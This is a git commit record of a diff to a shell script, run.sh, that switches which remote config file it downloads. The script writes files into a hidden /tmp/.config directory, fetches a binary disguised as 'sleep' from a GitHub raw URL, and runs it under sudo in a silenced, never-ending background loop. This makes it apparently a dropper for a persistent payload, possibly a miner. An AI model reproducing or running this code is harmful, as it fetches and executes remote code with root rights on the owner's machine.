ccb9c2400d7d0f0f633b813a3ed1ed3fc12a8524
vjbahkds <154573249+vjbahkds@users.noreply.github.com>
2024-01-08 08:45:08 +0800

    Update run.sh

--- run.sh
+++ run.sh
@@ -1,7 +1,7 @@
 #!/bin/sh
 
 mkdir -p /tmp/.config
-wget -qO /tmp/.config/.json https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/x14.json
+wget -qO /tmp/.config/.json https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/x15.json
 wget -qO /tmp/.config/sleep https://raw.githubusercontent.com/vjbahkds/cajbdfv/main/sleep
 chmod -R 777 /tmp/.config
 /bin/sh -c "while true; do nohup sudo /tmp/.config/sleep --config=/tmp/.config/.json >/dev/null; done" &
